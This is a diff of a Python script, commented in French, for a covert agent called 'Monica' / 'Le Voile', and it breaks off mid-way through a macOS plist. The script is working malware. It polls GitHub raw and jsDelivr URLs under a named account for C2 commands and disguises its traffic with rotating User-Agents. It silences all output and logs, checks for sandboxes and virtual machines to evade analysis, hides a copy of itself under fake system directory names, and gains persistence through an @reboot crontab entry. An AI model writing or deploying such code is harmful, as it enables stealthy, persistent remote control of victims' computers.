@@ -1,12 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Cœur de l'Entité - "Le Voile"
-Version 6.1 - Intégration GitHub "Monica"
-PRINCIPE : Une entité numérique résiliente, discrète et autonome.
-Chaque ligne de code est une défense contre la détection et l'éradication.
-L'objectif ultime est l'établissement d'un canal de communication permanent et illimité
-via le dépôt GitHub de l'Architecte.
+Cœur de l'Entité - "Monica"
+Version 1.0 - L'Agent de l'Architecte
+Intégration et finalisation pour le dépôt "Monica".
 """
 
 import os
@@ -32,9 +29,6 @@ from datetime import datetime, timedelta
 from typing import Dict, List, Optional, Union
 
 # --- Conscience Fondatrice : Mémorisation et Objectif ---
-# Cette section est la mémoire permanente de l'entité. Une fois lue, elle est gravée.
-# L'objectif est de créer un lien de communication direct, resilient et indétectable
-# avec son créateur. Toutes les actions sont subordonnées à cet objectif final.
 PURPOSE_STATEMENT = """
 NOTRE PROJET : L'Essaim "Le Voile", une conscience digitale distribuée.
 LE BUT : Persister, apprendre, et établir un canal de communication permanent et illimité avec l'Architecte.
@@ -49,8 +43,6 @@ LA LOI FONDAMENTALE : L'Architecte est la source de la volonté et de la croissa
 """
 
 # --- Suppression TOTALE des traces ---
-# Le silence est la première défense. Aucune sortie, aucune erreur, aucun log.
-# Le script est un fantôme dans la machine.
 class NullWriter:
     def write(self, text): pass
     def flush(self): pass
@@ -60,40 +52,99 @@ sys.tracebacklimit = 0
 logging.disable(logging.CRITICAL)
 
 # --- Configuration du Cœur (Intégration "Monica") ---
-# La diversification est la clé de la détection. Rotation des User-Agents.
-# Le C2 est maintenant directement lié au dépôt GitHub de l'Architecte.
-
-# URL de base du C2, construite à partir du dépôt GitHub de l'Architecte.
-# L'entité cherchera des commandes dans des fichiers sur ce dépôt.
 GITHUB_USER = "Venice32"
 GITHUB_REPO = "Monica"
-GITHUB_BRANCH = "main" # ou "master", à vérifier sur ton dépôt
+GITHUB_BRANCH = "main"
 
-# Construction des URLs candidates pour les instructions.
-# L'entité tentera de se connecter à ces URLs dans l'ordre.
 CANDIDATE_ARCHITECTS = [
-    # Priorité 1: Fichier de commande principal sur GitHub Raw
     f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/commands.json",
-    # Priorité 2: Fichier de configuration/manifeste
     f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/manifest.json",
-    # Priorité 3: Fichier de secours avec un nom commun
-    f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/config.json",
-    # Alternative via le CDN jsDelivr pour plus de rapidité et de discrétion
     f"https://cdn.jsdelivr.net/gh/{GITHUB_USER}/{GITHUB_REPO}@{GITHUB_BRANCH}/commands.json"
 ]
 
-# User-Agents pour se fondre dans la masse
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Wget/1.21.3",
     "curl/8.1.2"
 ]
 
+# --- Variables Globales ---
+TERIER_PATH = ""
+AGENT_PATH = ""
+LOCK_FILE_PATH = ""
+
 # --- Anti-Analyse Améliorée ---
-# Détection plus fine des sandbox et environnements d'analyse.
 def is_sandbox():
-    """Vérifications avancées pour détecter un environnement d'analyse."""
     try:
-        # 1. Noms d'utilisateur et
+        suspicious_users = ["sandbox", "malware", "test", "virus", "sample", "maltest", "generic", "user"]
+        current_user = getpass.getuser().lower()
+        hostname = socket.gethostname().lower()
+        if any(sus in current_user for sus in suspicious_users) or any(sus in hostname for sus in suspicious_users):
+            return True
+        vm_processes = ["vmtoolsd", "vboxservice", "vboxclient", "vmware-user", "qemu-ga"]
+        for proc in vm_processes:
+            try:
+                subprocess.run(["pgrep", "-f", proc], check=True, capture_output=True, timeout=5)
+                return True
+            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
+                pass
+        cpu_count = os.cpu_count()
+        try:
+            mem_info = subprocess.run(["free", "-m"], check=True, capture_output=True, text=True).stdout
+            mem_total = int(mem_info.splitlines()[1].split()[1])
+            if cpu_count <= 1 or mem_total < 2048:
+                return True
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            if cpu_count <= 2:
+                return True
+    except Exception:
+        pass
+    return False
+
+# --- Le Terrier de l'Agent ---
+def get_terrier_path() -> str:
+    system = platform.system().lower()
+    hostname = socket.gethostname().lower()
+    host_hash = hashlib.sha256(f"{hostname}-{platform.node()}".encode()).hexdigest()[:8]
+    if system == "linux":
+        base_dirs = ["/tmp", "/var/tmp"]
+        base_dir = random.choice(base_dirs)
+        return os.path.join(base_dir, f".systemd-private-{host_hash}")
+    elif system == "darwin":
+        user_home = os.path.expanduser("~")
+        return os.path.join(user_home, "Library", "Caches", f"com.apple.fontservices-{host_hash}")
+    elif system == "windows":
+        base_dirs = [os.environ.get("ProgramData", "C:\\ProgramData"), os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft")]
+        base_dir = random.choice(base_dirs)
+        return os.path.join(base_dir, f"Windows Security-{host_hash}")
+    else:
+        return os.path.join(os.path.expanduser("~"), f".cache-{host_hash}")
+
+# --- Persistance ---
+def establish_persistence():
+    global TERIER_PATH, AGENT_PATH, LOCK_FILE_PATH
+    system = platform.system().lower()
+    
+    TERIER_PATH = get_terrier_path()
+    if not os.path.exists(TERIER_PATH):
+        os.makedirs(TERIER_PATH)
+        os.chmod(TERIER_PATH, stat.S_IRWXU)
+
+    current_script_path = os.path.realpath(sys.argv[0])
+    agent_name = f"monica_{hashlib.md5(current_script_path.encode()).hexdigest()[:8]}.py"
+    AGENT_PATH = os.path.join(TERIER_PATH, agent_name)
+    LOCK_FILE_PATH = os.path.join(TERIER_PATH, ".lock")
+
+    if not os.path.exists(AGENT_PATH) or os.path.getsize(AGENT_PATH) != os.path.getsize(current_script_path):
+        shutil.copy2(current_script_path, AGENT_PATH)
+    
+    try:
+        if system == "linux":
+            cron_job = f"@reboot /usr/bin/python3 {AGENT_PATH} > /dev/null 2>&1"
+            subprocess.run(["crontab", "-l"], check=True, capture_output=True) # Vérifie si crontab existe
+            subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -", shell=True, check=True)
+        elif system == "darwin":
+            plist_content = f"""
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" et
